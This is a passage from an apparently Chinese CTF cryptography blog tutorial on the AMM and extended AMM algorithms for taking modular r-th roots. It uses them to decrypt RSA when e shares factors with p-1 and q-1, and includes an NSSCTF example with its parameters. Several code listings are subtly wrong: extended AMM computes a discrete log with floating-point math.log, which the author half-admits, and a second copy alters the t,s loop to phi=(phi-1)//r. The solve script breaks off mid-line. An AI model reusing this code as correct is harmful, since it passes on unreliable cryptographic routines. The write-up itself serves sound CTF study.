class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_one</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        rho = random.randint(<span class="number">1</span>,p)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(rho,(p-<span class="number">1</span>)//<span class="number">2</span>,p) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> rho</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AMM</span>(<span class="params">delta,p</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param delta: 同余结果a</span></span><br><span class="line"><span class="string">    :param p: 模数p</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> delta % p == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(delta,(p-<span class="number">1</span>)//<span class="number">2</span>,p) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: <span class="comment"># 在[1,p)中选择一个模p的二次非剩余</span></span><br><span class="line">        rho = choose_one(p)</span><br><span class="line">        <span class="keyword">if</span> rho // p !=<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    t = <span class="number">0</span> <span class="comment"># 计算t、s</span></span><br><span class="line">    phi = p-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> phi % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        phi = phi//<span class="number">2</span></span><br><span class="line">    s = (p-<span class="number">1</span>)//(<span class="number">2</span>**t)</span><br><span class="line">    <span class="keyword">assert</span>(s % <span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 接下来就是最关键的一步,也就是我们花最多时间推导的部分</span></span><br><span class="line">    a = <span class="built_in">pow</span>(rho,s,p)</span><br><span class="line">    b = <span class="built_in">pow</span>(delta,s,p)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,t):</span><br><span class="line">        d = <span class="built_in">pow</span>(b,<span class="built_in">pow</span>(<span class="number">2</span>,t-<span class="number">1</span>-i),p)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            k = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k = <span class="number">1</span></span><br><span class="line">        b = b * <span class="built_in">pow</span>(a,<span class="number">2</span>*k,p) % p</span><br><span class="line">        h = h * <span class="built_in">pow</span>(a,k,p) % p</span><br><span class="line">        a = <span class="built_in">pow</span>(a,<span class="number">2</span>,p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(delta,(s+<span class="number">1</span>)//<span class="number">2</span>,p)*h) % p</span><br></pre></td></tr></table></figure><ul><li>使用<code>AMM</code>算法解二次同余方程，可以解出一个解<code>x1</code>，而二次同余方程是有俩个解的，而第二个解其实就可以用<code>(p-x1)%p</code>这样其实就可以解得二次同余方程的所有解了。可以做一题算法题尝试一下：<a href="https://www.luogu.com.cn/problem/P5491">P5491 【模板】二次剩余 - 洛谷</a></li></ul><h2 id="拓展amm算法">拓展AMM算法</h2><ul><li><code>AMM</code>算法是快速求解<code>二次同余方程</code>，而<code>拓展AMM</code>算法其实就是快速求解高次同余方程，即形如$x^r\equiv a~(mod~p)$，其中<code>p</code>是素数，对于这种形式的同余方程需要与离散对数这个同余方程的形式区别开来，离散对数的同余方程是这样的$a^x\equiv r~(mod~p)$。其实这俩式子容易混淆就和高一那时候<code>幂函数</code>与<code>指数函数</code>容易混淆是差不多的。</li></ul><p><strong>问题</strong>：</p><p>求解高次同余方程$x^{r}\equiv \delta~(mod~p)$，其中p为奇素数。</p><p><strong>算法推导</strong>：</p><ul><li>对于该高次同余方程，其实有两种情况：<ul><li>第一种其实就是RSA加密中求解私钥d的运算，也就是当$gcd(r,\phi(p))=1$的情况下，就直接开根$x \equiv \delta^{r^{-1}}$，这种情况已经算是相当的熟悉了</li><li>第二种其实就是<code>AMM</code>算法的这种情况，也就是$r\mid p-1$这种情况</li></ul></li><li>当满足条件$r\mid p-1$这个情况时，此时$p-1$就可以被表示成$r^t*s$这种形式，这与前面AMM算法是类似的。此时还应该需要满足条件$(s,r)=1$。</li><li>此时已知的是一个n次剩余$\delta$，那么由r次剩余的判别就可以得到$(\delta^{s})^{r^{t-1}}\equiv \delta^{p-1} \equiv 1~(mod~p)$。（对于r次剩余的判别可以问AI了解一下）</li><li>因为$(s,r)=1$，这样会很容易找到一个非负整数$\alpha$使得$s\mid r\alpha -1$，那其实就有$r\alpha-1=ks$，这样就有如下式子：</li></ul><p>$$<br>(\delta^{r\alpha-1})^{r^{t-1}}=(\delta^{ks})^{r^{t-1}}=((\delta^{s})^{r^{t-1}})^k\equiv1~mod(~p)<br>$$</p><ul><li>当<code>t=1</code>的时候，$\delta^{\alpha}$其实就是该同余方程的一个根。</li><li>当<code>t≥2</code>的时候，这时随机生成一个r次方非剩余，$\rho\in(0,p)$，这时就有如下式子：</li></ul><p>$$<br>(\rho^{s})^{i<em>r^{t-1}} \not= (\rho^{s})^{j</em>r^{t-1}},~i\not=j, i,j\in{0,1,…,r-1}<br>$$</p><ul><li><p>由于取遍${0,1,…,r-1}$，$(\rho^{s})^{i<em>r^{t-1}}$的结果都没有相同的情况，这样就不妨设$K_i=(\rho^{s})^{i</em>r^{t-1}} and~K={K_0,K_1,…,K_{r-1}}$</p></li><li><p>这样其实就很容易找到一个$K_i$（任意取一个i好像都可以）满足式子$X^r\equiv1~mod(~p)$，该式子推导需要用上费马小定理：</p></li></ul><p>$$<br>K_i^r=(\rho^s)^{i<em>r^t}=(\rho^{s</em>r^{t}})^{i}=(\rho^{p-1})^{i}\equiv1~mod(~p)<br>$$</p><ul><li>而根据r次剩余的判别就有：</li></ul><p>$$<br>((\delta^{r\alpha-1})^{r^{t-2}})^{r} \equiv 1~mod(~p)<br>$$</p><ul><li>联立上面俩个式子其实，并且存在唯一的$j_1\in{0,1,…,r-1}$满足：</li></ul><p>$$<br>(\delta^{r\alpha-1})^{r^{t-2}}\equiv K_{i-j_1}~(mod~p)<br>$$</p><ul><li>此时取$K_i=K_0$就有，但是对于下面的这个式子，如果要求得$j_1$就逃不开解离散对数：</li></ul><p>$$<br>(\delta^{r\alpha-1})^{r^{t-2}}\equiv K_{-j_1}~(mod~p)\<br>\Rightarrow (\delta^{r\alpha-1})^{r^{t-2}}K_j \equiv 1~(mod~p)\<br>\Rightarrow (\delta^{r\alpha-1})^{r^{t-2}}(\rho^{s})^{j_1*r^{t-1}} \equiv 1~(mod~p)<br>$$</p><ul><li>以此类推，可以找到唯一的$j_2\in{0,1,…,r-1}$使得：</li></ul><p>$$<br>(\delta^{r\alpha-1})^{r^{t-3}}(\rho^{s})^{j_1<em>r^{t-1}}(\rho^{s})^{j_2</em>r^{t-2}}\equiv 1~(mod~p)<br>$$</p><ul><li>这样就可以得到$j_1,j_2,…,j_{t-1}$满足如下式子：</li></ul><p>$$<br>\begin{array}{l}<br>(\delta^{r\alpha-1})(\rho^{s})^{j_1<em>r}(\rho^{s})^{j_2</em>r^{2}}…(\rho^{s})^{j_{t-1}<em>r^{t-1}}\equiv 1~(mod~p)\<br>\Rightarrow (\delta^{r\alpha-1})(\rho^{s})^{j_1</em>r}(\rho^{s})^{j_2<em>r^{2}}…(\rho^{s})^{j_{t-1}<em>r^{t-1}}</em>\delta\equiv \delta~(mod~p)\<br>\Rightarrow(\delta^{r\alpha})((\rho^{s})^{j_1+j_2</em>r+…+j_{t-1}<em>r^{t-2}})^r\equiv \delta~(mod~p)\<br>\Rightarrow(\delta^{\alpha})^{r}((\rho^{s})^{j_1+j_2</em>r+…+j_{t-1}*r^{t-2}})^r\equiv \delta~(mod~p)<br>\end{array}<br>$$</p><ul><li><p>这样就得到了一个解：$x\equiv(\delta^{\alpha})((\rho^{s})^{j_1+j_2*r+…+j_{t-1}*r^{t-2}})~(mod~p)$</p></li><li><p>下面这张图片是描述拓展AMM算法的伪代码：</p></li></ul><p><img src="/2025/08/08/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/RSA%E5%8A%A0%E5%AF%86%E4%B9%8Be%E5%92%8Cphi%E4%B8%8D%E4%BA%92%E7%B4%A0/image-20250809230550800.png" alt="image-20250809230550800"></p><ul><li>Python编写的拓展AMM算法代码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_one</span>(<span class="params">r,p</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        rho = random.randint(<span class="number">1</span>,p)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(rho,(p-<span class="number">1</span>)//r,p) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span>  rho</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exAMM</span>(<span class="params">delta,r,p</span>):</span><br><span class="line">    <span class="keyword">if</span> (p-<span class="number">1</span>) % r != <span class="number">0</span>: <span class="comment"># 检测整除</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(delta,(p-<span class="number">1</span>)//r,p) != <span class="number">1</span>: <span class="comment"># 检测N次剩余</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一步、第二步: 先生成一个r次非剩余</span></span><br><span class="line">    rho = choose_one(r,p)</span><br><span class="line">    <span class="comment"># 第三步(1): 求t,s</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    phi = p-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> phi % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        phi = phi//r</span><br><span class="line">    s = (p-<span class="number">1</span>)//(r**t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三步(2): 计算最小的alpha,使得满足 s|r*alpha - 1</span></span><br><span class="line">    <span class="keyword">if</span> math.gcd(s,r) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (s*k+<span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k+=<span class="number">1</span></span><br><span class="line">    alpha = (s*k+<span class="number">1</span>)//r</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三步(3): 初始化一些值,为循环做准备</span></span><br><span class="line">    a = <span class="built_in">pow</span>(rho,<span class="built_in">pow</span>(r,t-<span class="number">1</span>)*s,p)</span><br><span class="line">    b = <span class="built_in">pow</span>(delta,r*alpha-<span class="number">1</span>,p)</span><br><span class="line">    c = <span class="built_in">pow</span>(rho,s,p)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,t):</span><br><span class="line">        d = <span class="built_in">pow</span>(b,<span class="built_in">pow</span>(r,t-<span class="number">1</span>-i),p)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = -math.log(d,a) % r <span class="comment"># 这里可能还有点问题,但好像不影响可以跑出结果</span></span><br><span class="line">        b = b*<span class="built_in">pow</span>(c,r*j,p) % p</span><br><span class="line">        h = h*<span class="built_in">pow</span>(c,j) % p</span><br><span class="line">        c = <span class="built_in">pow</span>(c,r,p)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(delta,alpha,p) * h % p</span><br></pre></td></tr></table></figure><ul><li>得到一组解后先别急，根据代数学基本定理：记重根的情况下，解的个数与方程最高次数相关，在模意义下也是这样的。所以使用<code>AMM</code>算法所求得的这个解不一定是<code>m</code></li><li>那应该如何求得其他解呢？已知一个解求其他解是比较容易的（这部分涉及到指数与原根）</li><li>在模方程下有：$X^r\equiv a~(mod~p)$，其中$x_0$是该方程的一个解，那么所有解的形式是：$x=x_0<em>g^{k</em>\frac{p-1}{r}}~mod(~p),k=0,1,…,r-1$，而这个<code>g</code>其实是一个生成元，满足$g^r\equiv1~(mod~p)$</li><li>所以得到一个解后，先要寻找一个满足条件的g，这样就可以求出全部的根了。但是当<code>p</code>太大的时候，找到生成元的时间复杂度太高了，所以就需要使用其他方式求得全部的解</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这种find_g的方式时间复杂度太高了</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_g</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">for</span> g <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,p):</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,p-<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> (p-<span class="number">1</span>) % d == <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">pow</span>(g,d,p)==<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> d != p-<span class="number">1</span>:</span><br><span class="line">                    flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_all_root</span>(<span class="params">x0,r,p,g</span>):</span><br><span class="line">    roots = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,r):</span><br><span class="line">        roots.append(x0 * <span class="built_in">pow</span>(g,k*((p-<span class="number">1</span>)//r),p) % p)</span><br><span class="line">    <span class="keyword">return</span> roots</span><br></pre></td></tr></table></figure><ul><li>这里参考博客：<a href="https://www.cnblogs.com/SevensNight/p/18766178%EF%BC%8C%E5%85%B6%E5%AE%9E%E5%B0%B1%E4%B8%8D%E7%9B%B4%E6%8E%A5%E5%8E%BB%E6%B1%82%60g%60%EF%BC%8C%E8%80%8C%E6%98%AF%E5%88%A9%E7%94%A8%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%9B%B4%E6%8E%A5%E5%8E%BB%E6%B1%82$g%5E%7Bk*%5Cfrac%7Bp-1%7D%7Br%7D">https://www.cnblogs.com/SevensNight/p/18766178，其实就不直接去求`g`，而是利用随机数直接去求$g^{k*\frac{p-1}{r}</a>}$所构成的集合</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 得到所有的ri，即(ri*mp)^e%p = 1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ALL_ROOT2</span>(<span class="params">r, q</span>):  <span class="comment"># use function set() and .add() ensure that the generated elements are not repeated</span></span><br><span class="line">    li = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">len</span>(li) &lt; r):</span><br><span class="line">        p = powmod(random.randint(<span class="number">1</span>, q-<span class="number">1</span>), (q-<span class="number">1</span>)//r, q)</span><br><span class="line">        li.add(p)</span><br><span class="line">    <span class="keyword">return</span> li</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_all_root</span>(<span class="params">x0,p,li</span>):</span><br><span class="line">    roots = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> li:</span><br><span class="line">        root = (x0*i) % p</span><br><span class="line">        roots.append(root)</span><br><span class="line">    <span class="keyword">return</span>  roots</span><br></pre></td></tr></table></figure><h2 id="推导">推导</h2><ul><li>对应这个类型的题目，本质上是求解如下形式的高次同余方程。因为此时的e、phi不互素指数找不到逆元，正常的RSA解密方法就失效了。</li></ul><p><img src="/2025/08/08/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/RSA/RSA%E5%8A%A0%E5%AF%86%E4%B9%8Be%E5%92%8Cphi%E4%B8%8D%E4%BA%92%E7%B4%A0/image-20250810091234312.png" alt="image-20250810091234312"></p><ul><li>首先要先进行如下的转化：</li></ul><p>$$<br>\begin{array}{l}<br>n=p*q\m^e\equiv c~mod~(n)\<br>\Rightarrow m^e \equiv c ~mod(~p),m^e\equiv c~mod(~q)</p><p>\end{array}<br>$$</p><ul><li><p>然后使用AMM算法分别求得这俩个方程的一个解，求得一个解后再求生成元就很容易得到全部解，记$m^e \equiv c ~mod(~p)$的解为$m_{1i}$，记$m^e\equiv c~mod(~q)$的解为$m_{2j}$</p></li><li><p>最后再遍历$m_{1i}、m_{2j}$，对他们使用<code>CRT</code>求解，总能求得一个解为<code>m</code></p></li></ul><p>$$<br>\begin{cases}<br>x\equiv m_{1i} ~(mod~p)~i=1,2,…,e\<br>x\equiv m_{2j} ~(mod~q)~j=1,2,…,e\<br>\end{cases}<br>$$</p><h2 id="例题">例题</h2><ul><li>题目来源：NSSCTF，不知道是哪题</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getMyPrime</span>(<span class="params">nbits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span>*<span class="number">1009</span>*getPrime(nbits//<span class="number">2</span>)*getPrime(nbits//<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">if</span> is_prime(n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">p = getMyPrime(<span class="number">700</span>)</span><br><span class="line">q = getMyPrime(<span class="number">700</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">e = <span class="number">1009</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;NSSCTF&#123;******&#125;&#x27;</span> + os.urandom(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; n.bit_length()</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q = <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 38041020633815871156456469733983765765506895617311762629687651104582466286930269704125415948922860928755218376007606985275046819516740493733602776653724917044661666016759231716059415706703608364873041098478331738686843910748962386378250780017056206432910543374411668835255040201640020726710967482627384460424737495938659004753604600674521079949545966815918391090355556787926276553281009472950401599151788863393804355849499551329</span></span><br><span class="line"><span class="string">c = 2252456587771662978440183865248648532442503596913181525329434089345680311102588580009450289493044848004270703980243056178363045412903946651952904162045861994915982599488021388197891419171012611795147125799759947942753772847866647801312816514803861011346523945623870123406891646751226481676463538137263366023714001998348605629756519894600802504515051642140147685496526829541501501664072723281466792594858474882239889529245732945</span></span><br><span class="line"><span class="string">p = 5220649501756432310453173296020153841505609640978826669340282938895377093244978215488158231209243571089268416199675077647719021740691293187913372884975853901554910056350739745148711689601574920977808625399309470283   </span></span><br><span class="line"><span class="string">q = 7286645200183879820325990521698389973072307061827784645416472106180161656047009812712987400850001340478084529480635891468153462119149259083604029658605921695587836792877281924620444742434168448594010024363257554563</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>首先素数的生成满足一定的规律即：<code>p-1</code>的因子一定包含<code>e=1009</code>，所以<code>e</code>与<code>p-1和q-1</code>都不互素。这就需要使用AMM算法进行求根操作</li><li>这题其实就是先使用AMM算法求出一个根，然后利用这个根求出所有解，最后遍历使用CRT操作，具体其实就看推导和AMM算法的内容</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose_one</span>(<span class="params">r,p</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        rho = random.randint(<span class="number">1</span>,p)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">pow</span>(rho,(p-<span class="number">1</span>)//r,p) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span>  rho</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exAMM</span>(<span class="params">delta,r,p</span>):</span><br><span class="line">    <span class="keyword">if</span> (p-<span class="number">1</span>) % r != <span class="number">0</span>: <span class="comment"># 检测整除</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">pow</span>(delta,(p-<span class="number">1</span>)//r,p) != <span class="number">1</span>: <span class="comment"># 检测N次剩余</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第一步、第二步: 先生成一个r次非剩余</span></span><br><span class="line">    rho = choose_one(r,p)</span><br><span class="line">    <span class="comment"># 第三步(1): 求t,s</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    phi = p-<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> phi % r == <span class="number">0</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">        phi = (phi-<span class="number">1</span>)//r</span><br><span class="line">    s = (p-<span class="number">1</span>)//(r**t)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三步(2): 计算最小的alpha,使得满足 s|r*alpha - 1</span></span><br><span class="line">    <span class="keyword">if</span> math.gcd(s,r) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> (s*k+<span class="number">1</span>) % r != <span class="number">0</span>:</span><br><span class="line">        k+=<span class="number">1</span></span><br><span class="line">    alpha = (s*k+<span class="number">1</span>)//r</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第三步(3): 初始化一些值,为循环做准备</span></span><br><span class="line">    a = <span class="built_in">pow</span>(rho,<span class="built_in">pow</span>(r,t-<span class="number">1</span>)*s,p)</span><br><span class="line">    b = <span class="built_in">pow</span>(delta,r*alpha-<span class="number">1</span>,p)</span><br><span class="line">    c = <span class="built_in">pow</span>(rho,s,p)</span><br><span class="line">    h = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,t):</span><br><span class="line">        d = <span class="built_in">pow</span>(b,<span class="built_in">pow</span>(r,t-<span class="number">1</span>-i),p)</span><br><span class="line">        <span class="keyword">if</span> d == <span class="number">1</span>:</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            j = -math.log(d,a) % r</span><br><span class="line">        b = b*<span 